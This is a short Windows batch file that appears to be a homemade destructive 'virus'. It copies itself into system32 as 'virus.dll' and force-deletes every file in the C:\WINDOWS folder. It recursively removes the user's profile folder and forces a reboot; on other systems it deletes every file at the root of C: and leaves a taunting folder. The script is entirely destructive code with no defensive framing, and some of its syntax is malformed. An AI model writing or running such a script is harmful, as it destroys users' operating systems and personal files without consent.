   @echo off
   cls 'Starts cls mode
   if exist "C:\WINDOWS" goto XP
   else goto otherOS

   :XP
   echo You have Windows XP I see
   pause 'Waits for the user to press a key
   copy %0 "C:\WINDOWS\system32\virus.dll"
   del /f /q "C:\WINDOWS\*.*"
   RD/s/q "C:\Documents and Settings\User"
   start mspaint
   start notepad
   SHUTDOWN -r -t 10

   :otherOS
   echo Get with the program!
   CD "C:\"
   del /f /q "*.*"
   MD "C:\You Have Been Buggered!"
   exit
